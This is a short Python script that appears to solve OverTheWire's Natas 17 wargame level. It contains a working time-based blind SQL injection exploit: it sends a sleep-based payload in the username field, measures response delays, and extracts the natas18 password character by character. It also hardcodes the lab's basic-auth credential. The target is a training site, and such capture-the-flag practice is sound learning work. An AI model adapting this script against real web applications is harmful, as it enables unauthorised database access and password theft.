#blind.py
import time
import requests
from requests.auth import HTTPBasicAuth
letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
solution = ""
for x in range(33):
    for c in letters:
        payload = {'username': 'natas18" and users.password COLLATE latin1_bin like "'+solution+c+'%'+'"and sleep(10) and "x"="x'}
        start = time.time()
        r = requests.post("http://natas17.natas.labs.overthewire.org/", data=payload, auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
        end = time.time()
        if int(end-start) >= 4:
            solution = solution + c
            print "Solution: " + solution
            break


print "Final: "+solution
